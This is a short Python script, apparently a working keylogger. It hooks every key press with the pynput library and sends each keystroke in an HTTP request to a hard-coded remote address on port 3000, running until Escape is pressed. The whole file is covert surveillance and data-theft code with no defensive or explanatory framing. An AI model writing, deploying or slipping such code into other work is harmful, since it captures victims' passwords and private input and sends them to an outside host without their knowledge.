import requests 
import pynput
import socket
from pynput.keyboard import Key, Listener
   
def get_url(key):
    return f'http://172.17.33.106:3000/key:{key}'

def on_press(key):
    try:
        s = key.char;
        requests.get(get_url(s))
    except AttributeError:
        s = key
        requests.get(get_url(s))
                          
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False
   
with Listener(on_press = on_press,
              on_release = on_release) as listener:
    listener.join()
